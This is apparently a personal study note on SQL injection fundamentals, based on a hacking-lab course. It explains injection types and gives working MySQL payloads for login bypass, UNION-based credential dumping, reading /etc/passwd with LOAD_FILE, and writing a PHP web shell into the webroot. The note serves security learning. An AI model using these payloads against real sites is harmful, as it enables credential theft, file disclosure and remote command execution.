---
{"dg-publish":true,"permalink":"/cybersecurity/bug-bounty-hunter/sql-injection/structured-query-language-sql-injection-fundamentals/","tags":["SQL","SQLInjection","SQLi"]}
---


Web applications often have a database structure on the backend.  The front end interacts with the database in real time.  As HTTP(s) requests arrive from the user, the application back-end queries the database to build responses.

SQL Injection (SQLi) refers to attacks against relational [[Cybersecurity/Bug Bounty Hunter/SQL Injection/Databases\|Databases]] such as MySQL.  SQL injection occurs when a mailcious user attempts to pass input that changes the final SQL queries directly against the database.

Some things that may be accessible:

* User names and passwords;
* Credit card info;
* etc.

SQLi is usually the result of poorly coded web apps or poorly secured back-end.

**Injection** occurs when user-input is inputted int a SQL query string without properly sanitizing or filtering the input.  To have a successful injection, we must ensure that the newly modified SQL query is still valid and does not have any syntax errors after our injection.

## Types of SQL Injections.

SQL Injections are categorized on how and where we retrieve their output.

**In-band**: when the output of the intended and new query are printed on the front end.  There are two types.  **Union Based and Error Based**.  **Union-based** we need to specify the exact column which we can read so the query will direct the output to be printed there.  In **Error based** we are able to get the PHP or SQL errors on the front end so we can intentionally cause an error that returns the output of our query.

**Blind**: When we do not get printed output of the injection.  Can be **boolean** and **time based**.  With **boolean** we structure SQL conditional statements to control whether the page returns any output at all.  For **time-based** we use conditional statements that delay the page response using the Sleep() function.

**Out-of-band** when we have no direct access to output whatsoever.

## [[Cybersecurity/Bug Bounty Hunter/SQL Injection/Structured Query Language (SQL) Injection Fundamentals\|SQLi]] Discovery

Potential payloads:
|Payload|URL Encoded|
|--------|---|
|`'`|%27|
|`"`|`%22`|
|`#`|`%23`
|`;`|`%3B`|
|`)`|`%29`|

## Subverting the query logic with "OR" operator

SQLi basically works by subverting the query logic to return a value that is advantageous to the attacker.  The typical learning example is a login that asks for "username" and "password".  The database is doing a query where it selects from the database "admin" AND the password "<admin's password>":

```sql
SELECT * from logins WHERE username = 'admin' AND password = 'somepassword'
```

Because of the [[Cybersecurity/Bug Bounty Hunter/SQL Injection/MySQL\|MySQL]] operator precedences, we can convert this query to evaluate to true by doing an injection.  (If the query evaluates to true then the front end will log us in.)

```sql
SELECT * from logins where username = 'admin' or '1'='1' and password = 'somepassword'
```

This will evaluate to true because the of the precedences of MySQL.  (AND before OR).  This image from the [hackthebox academy](https://academy.hackthebox.com) explains it well:
![Img](https://academy.hackthebox.com/storage/modules/33/or_inject_diagram.png)

The "OR" makes the overall statement evaluate to "True" allowing for a login even though we don't know the password.

## Using comments to subvert logic

SQL comments start with two dashes and a space.  Not just two dashes.  So: '-- '
not '--'.  What a pain, as this seems like something you might forget.  Sometimes this is URL encoded as ``` --+ ``` because in spaces are url encoded as a +

The # can also be sued but if your inputting the payload in a url in a browser you need to use the url encodeding for the # symbol which is '%23'.

## SQL Union Injection

We use the union function to join a queried table in the database with another table that we're interested in.  An example might be where the web page looks up products and product ids.  We'd use a UNION statement to add in the usernames and passwords.

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

We need to make sure that the columns of both tables match.  This means filling with junk data at times.  Typically, sequential numbers.
```mysql
order by 1-- -
cn' UNION select 1,2,3-- -
UNION select username, 2, 3, 4 from passwords-- -
```

### Detect number of columns

#### Using ORDER BY

Sequentially inject ORDER BY n into the field until you get an error saying that the n column is unknown.  The number of columns is n - 1. (e.g., ```sql 'order by 1-- ```)

#### Using UNION

Similarly sequentiall add to a ```cn' UNION select 1,2,3,n -- -``` statement until you get the response.

### General attack using Union Injection
1. Find databases by getting SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA.
2. Get a list of the tables in the database of interest by using the TABLES table in the INFORMATION_SCHEMA database.  Payload: ``````sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
3. Get a list of the column names in the table of interest by accessing the COLUMNS table in the INFORMATION_SCHEMA database.  The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used for this.
4. Once you know the columns you're looking for use a UNION query to dump the data in the columns you want. ```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -

## Reading Files

### Privileges
In MySQl, the DB user must have FILE privileges to load a file's content into a table and then dump the data from that table and read files.

The following queries help us figure out who we are:
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```
A payload using this is:
```sql
cn' UNION SELECT 1, user(), 3, 4-- -

cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

super_priv from mysql.user will list superusers.

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

```

Payload to see what privileges user 'root' has:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -
```

### LOAD_FILE()

The LOAD_FILE function lets us read data from files.  To read the /etc/passwd file:

```sql
SELECT LOAD_FILE('/etc/passwd');
```
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

The default Apache webroot is /var/www/html.  Knowing this, we can try to read the contents of any page there.
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

## Writing Files

To write files in a MySQL database you need:
1. User with FILE privilege enabled.
2. MySQL global **secure_file_priv** variable not enabled.
3. Write access tot he location we want to write to on the back-end server.

### Secure_file_priv

This variable is ussed to determine where to read/write files from.  An empty value lets us read files fromt he entire file system.  If a directory is set, we can only read from the folder specified.  If it's NULL then we can't read or write from anywhere.  **MySQL** uses **/var/lib/mysql-files** as the default folder and some configurations default to **NULL**.

Within MySQL we can use this query to obtain the value:
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

All variables and most configurations are stored within the INFORMATION_SCHEMA database.  MySQL global variables are stored in a table called **global_variables**, a table with two columns: **variable_name** and **variable_value**.

So a UNION injection to get this variable could be:
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

### SELECT INTO OUTFILE

This is cool as hell. The **SELECT INTO OUTFILE** statement can be used to write data from a query into a file.  Example of use:
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
You can also use this to SELECT strings into files.
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
Confirm write ability with a **UNION** payload:
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
We can use this to inject a php shell:
```php
<?php system($_REQUEST[0]); ?>
```
with this payload:
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

